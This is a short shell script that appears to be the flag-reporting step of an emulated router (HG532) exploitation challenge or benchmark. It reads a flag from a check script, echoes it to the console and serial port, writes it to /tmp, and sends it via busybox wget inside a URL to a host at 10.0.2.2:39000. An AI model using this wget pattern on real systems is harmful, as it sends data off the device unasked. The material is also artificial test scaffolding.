#!/bin/sh

FLAG="$("/bin/check_cache.sh")"

printf '__HG532_FLAG__%s\n' "$FLAG" >/dev/console 2>/dev/null || true
printf '__HG532_FLAG__%s\n' "$FLAG" >/dev/ttyS0 2>/dev/null || true
printf '%s\n' "$FLAG" > /tmp/flag_out
sync
/bin/busybox wget -qO- "http://10.0.2.2:39000/${FLAG}" >/dev/null 2>&1 || true
